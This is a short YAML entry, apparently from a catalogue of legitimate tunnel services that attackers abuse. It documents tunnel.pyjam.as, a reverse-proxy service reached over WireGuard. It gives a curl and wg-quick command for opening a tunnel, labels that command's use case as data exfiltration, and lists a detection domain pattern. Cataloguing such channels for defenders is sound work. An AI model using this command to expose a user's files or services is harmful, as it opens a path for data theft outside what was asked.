---
name: Pyjam.as
description: tunnel.pyjam.as can be used as an ephemeral reverse proxy for your local services. This may be useful, for instance when you need to show your friend something cool you've built.
author: Phill Moore
created: 2025-04-22
commands:
  - command: curl https://tunnel.pyjam.as/<PORT> > <CONFIG> && wg-quick up ./<CONFIG>
    description: Create tunnel through public service
    usecase: Exposing local services/file system over the internet for data exfiltration.
    category: Exfiltrate
    privileges: User
    operating_system: Windows, Linux, MacOS
Custom_Domain_Supported: True
full_path:
  - path: Execution via command line using native tools
detection:
  - domain: *tunnel.pyjam.as*
resources:
  - link: https://gitlab.com/pyjam.as/tunnel
acknowledgement:
  - person: Phill Moore
    handle: '@randomaccess3'
---